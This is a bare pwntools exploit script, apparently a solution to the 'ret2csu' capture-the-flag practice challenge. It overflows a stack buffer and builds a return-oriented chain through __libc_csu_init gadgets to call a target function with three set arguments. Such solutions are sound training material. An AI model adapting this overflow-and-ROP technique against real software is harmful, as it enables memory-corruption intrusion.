from pwn import *

exe = context.binary = ELF(args.EXE or './ret2csu')
libc = ELF(exe.libc.path)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

io = start()

payload  = b""
payload += b"A"*0x28

payload += p64(0x40069a)
payload += p64(0x00)
payload += p64(0x01)
payload += p64(0x600398)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)

payload += p64(0x400680)
payload += p64(0x00)
payload += p64(0x00)
payload += p64(0x00)
payload += p64(0x00)
payload += p64(0x00)
payload += p64(0x00)
payload += p64(0x00)

payload += p64(0x4006a3)
payload += p64(0xdeadbeefdeadbeef)

payload += p64(0x400510)

io.sendline(payload)
io.interactive()
